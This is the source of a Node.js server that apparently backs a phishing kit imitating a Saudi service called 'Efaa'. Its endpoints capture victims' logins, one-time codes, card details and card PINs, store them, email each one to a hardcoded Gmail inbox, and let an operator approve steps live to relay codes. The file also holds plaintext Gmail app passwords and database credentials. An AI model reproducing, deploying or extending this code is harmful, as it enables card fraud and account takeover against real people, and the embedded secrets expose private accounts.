const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors("*"));
app.use(require("morgan")("dev"));

const emailData = {
  user: "pnusds269@gmail.com",
  pass: "febn zhvn rnzf guog",
  // user: "saudiabsher1990@gmail.com",
  // pass: "qlkg nfnn xaeq fitz",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Efaa Visa"
          : type === "login" //
          ? "Efaa Login "
          : type === "visaOtp" //
          ? "Efaa Visa Otp "
          : type === "pin" //
          ? "Efaa Visa Pin "
          : type === "loginOtp" //
          ? "Efaa Login Code "
          : "Efaa "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.send("ok"));

app.delete('/',async(req,res)=>{
    await Order.find({}).then(async (orders) => {
        await Promise.resolve(
          orders.forEach(async (order) => {
            await Order.findByIdAndDelete(order._id);
          })
        );
      }).then(()=>res.sendStatus(200))
})

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/loginOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    loginOtp: req.body.otp,
    checked: false,
    loginOTPAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "loginOtp").then(() => res.sendStatus(200))
  );
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  console.log(req.body)
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    visaAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visa").then(() => res.sendStatus(200))
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    visa_otp: req.body.visa_otp,
    checked: false,
    visaOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visaOtp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    visa_pin: req.body.visa_pin,
    checked: false,
    visaPinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});


app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("connected");

  socket.on("login", () => io.emit("login"));
  
  socket.on("acceptLogin", async (id) => {
    console.log("acceptLogin From Admin", id);
    await Order.findByIdAndUpdate(id, { loginAccept: true });
    io.emit("acceptLogin", id);
  });
  socket.on("declineLogin", async (id) => {
    console.log("declineLogin Form Admin", id);
    await Order.findByIdAndUpdate(id, { loginAccept: true });
    io.emit("declineLogin", id);
  });

  socket.on("otpLogin", () => io.emit("otpLogin"));

  socket.on("acceptOTPLogin", async (data) => {
    console.log("acceptOTPLogin From Admin", data);
    await Order.findByIdAndUpdate(data.id, {
      loginOTPAccept: true,
      price: data.price,
    });
    io.emit("acceptOTPLogin", data);
  });
  socket.on("declineOTPLogin", async (id) => {
    console.log("declineOTPLogin Form Admin", id);
    await Order.findByIdAndUpdate(id, { loginOTPAccept: true });
    io.emit("declineOTPLogin", id);
  });



  socket.on("visa", (data) => {
    console.log("visa  received", data);
    io.emit("visa", data);
  });
  socket.on("acceptVisa", async (id) => {
    console.log("acceptVisa From Admin", id);
    await Order.findByIdAndUpdate(id, { visaAccept: true });
    io.emit("acceptVisa", id);
  });
  socket.on("declineVisa", async (id) => {
    console.log("declineVisa Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaAccept: true });
    io.emit("declineVisa", id);
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });

  socket.on("acceptVisaOTP", async (id) => {
    console.log("acceptVisaOTP From Admin", id);
    await Order.findByIdAndUpdate(id, { visaOtpAccept: true });
    io.emit("acceptVisaOTP", id);
  });

  socket.on("declineVisaOTP", async (id) => {
    console.log("declineVisaOTP Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaOtpAccept: true });
    io.emit("declineVisaOTP", id);
  });
  
  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });

  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { visaPinAccept: true });
    io.emit("acceptVisaPin", id);
  });

  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaPinAccept: true });
    io.emit("declineVisaPin", id);
  });





});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/Efaa")
  .then((conn) =>
    server.listen(PORT, async () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    
    })
  );
